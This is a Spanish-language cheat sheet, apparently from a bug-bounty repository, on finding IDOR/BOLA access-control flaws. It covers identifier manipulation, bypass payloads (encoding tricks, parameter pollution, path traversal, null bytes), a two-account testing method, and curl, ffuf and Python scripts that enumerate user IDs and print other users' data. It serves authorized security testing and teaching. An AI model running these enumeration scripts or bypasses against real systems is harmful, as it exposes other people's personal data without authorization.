# 🔓 IDOR - Insecure Direct Object Reference

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Referencia directa insegura a objetos
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 📋 Índice

- [¿Qué es IDOR?](#-qué-es-idor)
- [Dónde buscar](#-dónde-buscar)
- [Tipos de identificadores y manipulación](#-tipos-de-identificadores-y-manipulación)
- [Técnicas de elusión](#-técnicas-de-elusión)
- [Metodología de pruebas](#-metodología-de-pruebas)
- [Herramientas y automatización](#-herramientas-y-automatización)

---

## 🎯 ¿Qué es IDOR?

Una vulnerabilidad **IDOR** aparece cuando una aplicación utiliza referencias directas a objetos internos (registros de bases de datos, archivos, etc.) sin comprobar adecuadamente la autorización.

> **Concepto clave:** que un identificador sea visible, secuencial o fácil de adivinar no demuestra IDOR. El fallo aparece cuando se permite acceder o actuar sobre un objeto sin autorización. Los identificadores aleatorios tampoco sustituyen esos controles. Véase la [explicación de PortSwigger](https://portswigger.net/web-security/access-control/idor).

### Impacto
- 🔴 **Robo de datos** - Acceder a los datos de otros usuarios
- 🔴 **Escalada de privilegios** - Acceder a funciones administrativas
- 🔴 **Toma de control de cuentas** - Modificar otras cuentas
- 🔴 **Manipulación de datos** - Eliminar o modificar registros

### IDOR frente a BOLA
| IDOR | BOLA |
|------|------|
| Término tradicional | Término utilizado en seguridad de API |
| — | Broken Object Level Authorization (fallo de autorización a nivel de objeto) |

---

## 🔍 Dónde buscar

### Parámetros de URL
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

### Cuerpo POST/PUT
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### Cabeceras
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### Parámetros habituales
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

### Endpoints habituales
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

## 🔢 Tipos de identificadores y manipulación

### Identificadores secuenciales
```
# El caso más habitual: incrementar o decrementar
/api/users/1
/api/users/2
/api/users/3

# Probar los límites
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUIDs
```
# Comprobar si son realmente aleatorios
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # Incrementar la última parte

# Buscar patrones
# UUID basados en tiempo (v1): previsibles según el original
# UUID aleatorios (v4): más difíciles de adivinar
```

### Identificadores codificados
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# Probar identificadores codificados
/api/users/MTIz  → decodificado = 123
/api/users/MTI0  → decodificado = 124

# Codificación hexadecimal
123 → 7b
124 → 7c
```

> **Corrección de Base64:** `echo` añade normalmente un salto de línea; por tanto, los comandos mostrados producirían `MTIzCg==` y `MTI0Cg==`, no los valores indicados. `MTIz` y `MTI0` corresponden a codificar únicamente los bytes de `123` y `124`. Se conservan los ejemplos originales.

### Identificadores con hash
```
# MD5 del identificador
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# Probar distintos algoritmos
# Comprobar si el hash deriva del identificador o de un valor aleatorio
```

### Formatos personalizados
```
# Identificadores con prefijo
/user/USR_123
/order/ORD_456
/doc/DOC_789

# Basados en una marca de tiempo
/file/20240128_001
/file/20240128_002
```

---

<a id="-técnicas-de-elusión"></a>
## 🛡️ Técnicas de elusión

### Manipulación de parámetros
```bash
# Original
GET /api/users/123

# Variantes
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### Cambio de método HTTP
```bash
# Si GET está bloqueado, probar otros métodos
GET /api/users/124     → Blocked
POST /api/users/124    → Allowed?
PUT /api/users/124     → Allowed?
```

### Encapsular en arrays u objetos
```json
// Si id=124 está bloqueado, probar:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### Elusión mediante codificación
```
# Codificación URL
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# Codificación doble
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → 124 con caracteres de ancho completo
```

### Manipulación de mayúsculas y minúsculas
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

### Combinación con recorrido de rutas (path traversal)
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### Byte nulo
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

> **Formato de los ejemplos:** los bloques JSON siguientes incluyen comentarios explicativos y varios objetos independientes; no constituyen un único documento JSON válido para enviar directamente. El operador `$eq` y las variantes codificadas solo tienen efecto si el servidor los interpreta de esa forma.

### Inyección de parámetros JSON
```json
// Petición original
{"user_id": 123, "action": "view"}

// Ataque
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

### HPP (HTTP Parameter Pollution, contaminación de parámetros HTTP)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

## 📋 Metodología de pruebas

### Paso 1: identificar
```
1. Identificar todos los endpoints con referencias a objetos
2. Anotar todos los parámetros que parezcan identificadores
3. Crear dos cuentas de prueba (usuario A y usuario B)
```

### Paso 2: enumerar
```
1. Con el usuario A, anotar sus identificadores
2. Con el usuario B, anotar sus identificadores
3. Identificar patrones en los identificadores
```

### Paso 3: probar
```
1. Con el usuario A, intentar acceder a objetos del usuario B
2. Probar todas las operaciones CRUD:
   - Leer (GET)
   - Crear (POST)
   - Actualizar (PUT/PATCH)
   - Eliminar (DELETE)
```

### Paso 4: ampliar las pruebas
```
1. Probar identificadores administrativos (a menudo 1, admin, 0)
2. Probar valores especiales (null, undefined, *)
3. Combinar con otras vulnerabilidades
```

### Lista de comprobación
```markdown
- [ ] Parámetros de URL
- [ ] Parámetros del cuerpo POST
- [ ] Cabeceras (cookies y personalizadas)
- [ ] Campos ocultos de formularios
- [ ] Endpoints de API
- [ ] Descargas de archivos
- [ ] Funciones de exportación
- [ ] Funciones de eliminación
- [ ] Funciones administrativas
```

---

<a id="-herramientas-y-automatización"></a>
## 🛠️ Herramientas y automatización

### Extensiones de Burp Suite
```
- Autorize (detección automatizada de posibles IDOR)
- AuthMatrix
- Auto Repeater
```

### Configuración de Autorize
```
1. Instalar la extensión Autorize
2. Copiar la cookie de sesión del usuario B
3. Añadirla a Autorize
4. Navegar como usuario A
5. Autorize realiza pruebas con la sesión del usuario B
```

### Pruebas manuales con curl
```bash
# Token del usuario A
TOKEN_A="user_a_jwt_token"

# Intentar acceder al recurso del usuario B
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# Recorrer los identificadores
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

### ffuf para IDOR
```bash
# Identificadores numéricos
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# Con una lista de palabras
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

### Script Python
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

> **Validación de los scripts:** HTTP 200 o la presencia de `email` no bastan para confirmar IDOR. Comprueba con las dos cuentas que se devuelve un objeto ajeno y que su acceso no está permitido por el diseño. Los scripts son heurísticos; el ejemplo Python también presupone una respuesta JSON válida.

## 📊 Referencia rápida

### Funciones que suelen presentar vulnerabilidades
| Función | Riesgo |
|----------|------|
| Ver un perfil | Filtración de datos |
| Descargar un archivo | Acceso a archivos |
| Eliminar un elemento | Pérdida de datos |
| Actualizar la configuración | Toma de control de la cuenta |
| Consultar pedidos | Vulneración de la privacidad |
| Exportar datos | Robo masivo de datos |

### Qué incluir en el informe
```markdown
## IDOR en el perfil de usuario

**Endpoint:** GET /api/users/{id}

**Pasos:**
1. Iniciar sesión como usuario A (ID: 123)
2. Solicitar GET /api/users/124
3. Observar que se devuelven los datos del usuario B

**Impacto:** cualquier usuario autenticado puede acceder a
la información personal de todos los demás usuarios.

**PoC:**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

## 💡 Consejos prácticos

1. **Utiliza dos cuentas** - Realiza siempre las pruebas con dos cuentas
2. **Comprueba todos los métodos** - GET, POST, PUT, DELETE
3. **Busca en todas partes** - URL, cuerpo, cabeceras y cookies
4. **Prueba casos límite** - 0, -1, null, undefined
5. **Combina ataques** - IDOR + CSRF, IDOR + XSS
6. **Revisa las exportaciones** - Las exportaciones PDF y CSV pueden ser vulnerables
7. **Revisa las API móviles** - Pueden presentar controles distintos de los de la web

---

## 📚 Recursos

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [Control de acceso de PortSwigger](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 ¡Encuentra esas vulnerabilidades IDOR!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
